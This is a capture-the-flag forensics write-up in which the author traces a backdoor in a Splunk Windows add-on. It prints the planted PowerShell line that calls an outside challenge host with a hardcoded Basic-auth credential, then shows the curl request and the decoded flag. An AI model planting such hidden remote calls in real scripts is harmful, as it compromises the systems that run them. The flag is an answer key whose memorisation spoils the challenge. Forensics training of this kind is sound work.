# ✅ FORENSICS - Backdoored Splunk

Writeup by: [@goproslowyo](https://github.com/goproslowyo)

## Tags

- medium

Files:

- [Splunk_TA_windows.zip](./Splunk_TA_windows.zip)

## Description

Author: Adam Rice

You've probably seen Splunk being used for good, but have you seen it used for evil?  NOTE: the focus of this challenge should be on the downloadable file below. It uses the dynamic service that is started,  but you must put the puzzle pieces together to be retrieve the flag.  Download the file(s) below and press the `Start` button on the top-right to begin this challenge.

## Writeup

The challenge description says to start the service and connect to it by piece together stuff from the download. If you visit the challenge server URL you'll get an Access Denied error.

If you search for the server hostname, `chal.ctf.games`. you'll find something interesting:

![ripgrep](./ripgrep.png)

```shell
$ rg chal.ctf.games
Splunk_TA_windows/bin/powershell/nt6-health.ps1
95:$OS = @($html = (Invoke-WebRequest http://chal.ctf.games:$PORT -Headers @{Authorization=("Basic YmFja2Rvb3I6dXNlX3RoaXNfdG9fYXV0aGVudGljYXRlX3dpdGhfdGhlX2RlcGxveWVkX2h0dHBfc2VydmVyCg==")} -UseBasicParsing).Content
```

And you should quickly see what to do:

![Authenticate for the flag](./flag.png)

```shell
$ curl -H 'Authorization: Basic YmFja2Rvb3I6dXNlX3RoaXNfdG9fYXV0aGVudGljYXRlX3dpdGhfdGhlX2RlcGxveWVkX2h0dHBfc2VydmVyCg=='     http://chal.ctf.games:31106
<!-- ZWNobyBmbGFnezYwYmIzYmZhZjcwM2UwZmEzNjczMGFiNzBlMTE1YmQ3fQ==
$ echo -n 'ZWNobyBmbGFnezYwYmIzYmZhZjcwM2UwZmEzNjczMGFiNzBlMTE1YmQ3fQ==' | base64 -d
echo flag{60bb3bfaf703e0fa36730ab70e115bd7}
```
